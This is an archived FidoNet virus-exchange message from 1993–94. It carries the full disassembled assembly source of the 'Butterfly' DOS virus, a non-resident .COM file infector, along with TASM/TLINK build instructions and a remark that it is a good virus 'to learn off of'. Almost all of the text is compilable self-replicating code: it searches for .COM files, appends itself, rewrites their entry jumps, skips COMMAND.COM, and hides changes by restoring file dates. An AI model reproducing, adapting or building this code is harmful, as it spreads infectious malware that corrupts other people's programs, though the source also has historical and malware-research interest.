;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 51 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : BUTTRFLY.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Hans Schotel, 2:283/718 (06 Nov 94 17:56)
;* To   : Fred Lee
;* Subj : BUTTRFLY.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Hans.Schotel@f718.n283.z2.fidonet.org
Comment|
************************************************************************
  Virus Name: Butterfly Virus
  Effective Length: 302 bytes
  Disassembled by Silent Death - 1993

  Notes:
        - Non-Resident .COM appender
        - infects up to 4 files in the current directory
        - infected files have 01h as the 4th byte
        - ok virus to learn off of but a lot of wasteful code

  To Compile: [Byte matchup!]
        TASM /m File.asm
        TLINK /t FILE.obj
************************************************************************|

        .model tiny
        .code
        org 100h

start:
        jmp     virus
        nop
        nop

oldjmp  db      0cdh                    ; int 20h
newjmp  db      20h
        db      90h                     ; nop
id      db      1                       ; infection marker

virus:
        call    delta                   ; get delta offset
delta:
        pop     bp
        sub     bp,10Bh                 ; adjust delta offset

        mov     di,100h                 ; move bytes to the start
        lea     si,[bp+oldjmp]          ; original starting
        mov     cx,4                    ; move four bytes
        cld                             ; clear direction flag
        rep     movsb                   ; move the bytes

        mov     ah,1Ah                  ; set dta
        lea     dx,[bp+dta]             ; set into heap
        int     21h

        mov     byte ptr [bp+offset counter],0 ; reset counter

        mov     ah,4Eh                  ; find first asciiz file
        lea     si,[bp+dta+1eh]         ; points to fname in dta
        lea     dx,[bp+fspec]           ; files to find (*.COM)
        push    dx                      ; save file spec
        jmp     short findfiles

returntohost:
        mov     ah,1Ah                  ; set dta
        mov     dx,80h                  ; to original position
        int     21h

        xor     ax,ax                   ; clear all registers
        xor     bx,bx                   ; no real need to
        xor     cx,cx
        xor     dx,dx
        xor     si,si
        xor     di,di
        mov     sp,0FFFEh               ; adjust stack pointer
        mov     bp,100h                 ; return to here
        push    bp
        xor     bp,bp                   ; clear this
        retn                            ; return to host

closeup:
        or      bx,bx                   ; is handle 0?
        jz      findnext                ; yup so don't bother closing

        mov     ch,0                    ; get attributes
        mov     cl,[bp+dta+15h]         ; theres no point!

        mov     ax,5701h                ; set files date/time
        mov     cx,word ptr [bp+dta+16h]; get original time
        mov     dx,word ptr [bp+dta+18h]; get original date
        int     21h

        mov     ah,3Eh                  ; close file
        int     21h
        xor     bx,bx                   ; delete handle

findnext:
        mov     ah,4Fh                  ; find next file

findfiles:
        pop     dx                      ; get filespec
        push    dx
        mov     cx,7                    ; all attributes
        xor     bx,bx                   ; make sure no handle
        int     21h

        jnc     infect                  ; jump if file found
        jmp     returntohost2           ; no files found then quit

vname   db      0FFh
        db      'Goddamn Butterflies'   ; YA Know!
        db      0FFh

infect:
        mov     dx,si                   ; dx => fname in dta

        mov     ax,3D02h                ; open file read/write
        int     21h
        jc      closeup                 ; if error close up, get another
        mov     bx,ax                   ; handle to bx

        mov     ah,3Fh                  ; read from file
        mov     cx,4                    ; four bytes
        lea     dx,[bp+oldjmp]          ; save here
        int     21h

        mov     ax,word ptr [bp+dta+23h]; get end of filename
        cmp     ax,444Eh                ; is file command.com?
        je      closeup                 ; yup so leave it

        cmp     [bp+id],1               ; is file infected?
        je      closeup                 ; yup so leave it

        mov     ax,word ptr [bp+dta+1ah]; get file size
        cmp     ax,121                  ; is file smaller than 121?
        jb      closeup                 ; if it is leave it

        mov     ax,4202h                ; file pointer to end
        cwd
        xor     cx,cx
        int     21h

        cmp     ax,64768                ; is file to big to infect
        ja      closeup                 ; if above then jump

        mov     [bp+data],ax            ; save file size

        lea     dx,[bp+oldjmp]          ; buffer to write from
        mov     cx,4                    ; 4 bytes
        mov     ah,40h                  ; write oldjmp to end of file
        int     21h

        lea     dx,[bp+virus]           ; start of virus
        mov     cx,12Ah                 ; write virus (298) to end
        mov     ah,40h                  ; write to file
        int     21h

        mov     ax,4200h                ; file pointer to start
        cwd
        xor     cx,cx
        int     21h

        mov     ax,[bp+data]            ; get the file size
        inc     ax                      ; increment the file size
        mov     word ptr [bp+newjmp],ax ; save the new jump
        mov     [bp+oldjmp],0E9h        ; new jump
        mov     [bp+id],1               ; infection marker

        lea     dx,[bp+oldjmp]          ; new jump
        mov     ah,40h                  ; write new start
        mov     cx,4                    ; four bytes
        int     21h

        inc     [bp+counter]
        cmp     [bp+counter],4          ; has 4 files been infected?
        jae     returntohost3           ; yup so return to host
        jmp     closeup                 ; close current file

returntohost2:                          ; This is a total waste!
        mov     di,100h                 ; start of file
        cmp     word ptr [di],20CDh     ; are we the original
        je      returntohost3           ; yup

returntohost3:
        jmp     returntohost

fspec   db      '*.COM',0               ; files to find

dta     db      43 dup (0)              ; holds dta
counter db      0                       ; holds file counter
data    dw      0                       ; holds new jump offset

        end     start

;-+-  Concord/QWK O.O1 Beta-7
; + Origin: Data Fellows BBS (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;/L            Specify library search paths
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

